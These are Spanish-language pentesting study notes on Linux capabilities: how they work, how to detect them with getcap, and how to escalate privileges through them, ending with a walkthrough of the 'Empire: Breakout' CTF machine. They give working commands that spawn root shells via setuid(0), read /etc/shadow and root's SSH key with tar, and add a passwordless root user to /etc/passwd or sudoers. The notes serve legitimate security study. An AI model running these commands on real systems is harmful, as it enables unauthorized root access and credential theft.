# Linux Capabilities

## Descripción

Las Linux Capabilities son un mecanismo que divide los poderes absolutos de root en unidades más pequeñas y específicas. Permiten que un proceso tenga solo los privilegios que necesita sin ser root completo. Cuando están mal asignadas a binarios accesibles por usuarios normales, son un vector de escalada de privilegios.

> Ver también: **Linux-Permisos-y-Privilegios.md** para el contexto completo del sistema de permisos de Linux.

---

## Por qué existen

Históricamente en Linux era todo o nada: o eras root con poderes absolutos o eras un usuario normal sin privilegios especiales. Esto era problemático porque servicios como `ping` necesitan crear paquetes de red raw (privilegio de root) pero no deberían tener acceso a todo el sistema.

Las capabilities resuelven esto: `ping` recibe solo `cap_net_raw` para crear paquetes, sin ningún otro privilegio de root.

---

## Diferencia con SUID

| | SUID | Capabilities |
|---|------|-------------|
| **Cómo funciona** | El proceso corre como el propietario del archivo | El proceso tiene poderes específicos de root |
| **Granularidad** | Todo o nada (root completo) | Solo los privilegios necesarios |
| **Dónde se guarda** | Bits de permisos del archivo | Atributos extendidos (xattrs) |
| **Cómo buscarlos** | `find / -perm -4000` | `getcap -r /` |
| **Visibilidad en ls** | Sí — aparece `s` en permisos | No — invisible en `ls -la` |

---

## Cómo detectarlas

```shell
getcap -r / 2>/dev/null
```

Salida típica:
```
/home/cyber/tar cap_dac_read_search=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/python3.9 cap_setuid=ep
```

### Formato de la salida

```
/ruta/binario   CAPABILITY=FLAGS
```

Los flags indican cuándo está activa la capability:

| Flag | Nombre | Significado |
|------|--------|-------------|
| `e` | Effective | Activa cuando el binario se ejecuta |
| `p` | Permitted | Disponible para usar |
| `i` | Inherited | Se hereda a procesos hijo |

El más común en CTF es `=ep` — activa y disponible.

---

## Capabilities peligrosas en pentesting

### cap_setuid ⭐⭐⭐ (la más peligrosa)

Permite cambiar el UID del proceso a cualquier valor, incluyendo 0 (root).

```shell
# Python con cap_setuid
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# Perl con cap_setuid
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### cap_dac_read_search ⭐⭐⭐

Ignora los permisos de **lectura** del sistema de archivos (DAC = Discretionary Access Control). El proceso puede leer cualquier archivo aunque no tenga permisos.

```shell
# tar con cap_dac_read_search — leer /etc/shadow
./tar -cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar
cat etc/shadow

# tar con cap_dac_read_search — leer clave SSH de root
./tar -cvf root_ssh.tar /root/.ssh/id_rsa
./tar -xvf root_ssh.tar
cat root/.ssh/id_rsa
```

### cap_dac_override ⭐⭐⭐

Ignora **todos** los permisos DAC — tanto lectura como escritura. Aún más peligroso que `cap_dac_read_search`.

```shell
# Escribir en /etc/passwd para añadir un usuario root
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

### cap_sys_admin ⭐⭐⭐

La más amplia — permite casi todo. Montar sistemas de archivos, cambiar namespaces, acceder a dispositivos...

### cap_net_bind_service

Permite abrir puertos < 1024 sin ser root. No útil para escalar privilegios directamente.

### cap_net_raw

Permite crear paquetes de red raw. Lo usa `ping`. No útil para escalar directamente.

---

## Flujo de explotación según capability

### Si encuentras cap_setuid

```shell
# En Python
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"

# En Ruby
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'

# En Perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash"'
```

### Si encuentras cap_dac_read_search

```shell
# Con tar — empaquetar y extraer archivos protegidos
./tar -cvf archivo.tar /ruta/protegida
./tar -xvf archivo.tar
cat ruta/protegida

# Objetivos prioritarios:
# /etc/shadow          → hashes de contraseñas
# /root/.ssh/id_rsa    → clave SSH privada de root
# /root/root.txt       → flag de root en CTFs
# /root/               → todo el directorio home de root
```

### Si encuentras cap_dac_override

```shell
# Añadir usuario root en /etc/passwd (sin hash = sin contraseña)
echo 'hacker::0:0::/root:/bin/bash' >> /etc/passwd
su hacker

# Modificar /etc/sudoers
echo 'cyber ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
sudo bash
```

---

## Asignar y quitar capabilities (como root)

```shell
# Asignar capability a un binario
setcap cap_setuid+ep /usr/bin/python3

# Quitar todas las capabilities de un binario
setcap -r /usr/bin/python3

# Ver capabilities de un binario específico
getcap /usr/bin/python3
```

---

## Checklist rápido

```
[ ] getcap -r / 2>/dev/null
[ ] ¿cap_setuid? → python/perl/ruby setuid(0) → bash
[ ] ¿cap_dac_read_search? → tar/cp para leer /etc/shadow y /root/
[ ] ¿cap_dac_override? → escribir en /etc/passwd o /etc/sudoers
[ ] ¿cap_sys_admin? → buscar en GTFOBins el binario específico
```

---

## Ejemplo real — Máquina Empire: Breakout

```shell
getcap -r / 2>/dev/null
# /home/cyber/tar cap_dac_read_search=ep

# Leer /etc/shadow (solo legible por root normalmente)
./tar -cvf shadow.tar /etc/shadow
./tar -xvf shadow.tar
cat etc/shadow
# root:$y$j9T$M3BDdkxYOlVM6ECoqwUFs.$...

# Leer directamente la flag de root
./tar -cvf root.tar /root/
./tar -xvf root.tar
cat root/rOOt.txt
# 3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
```
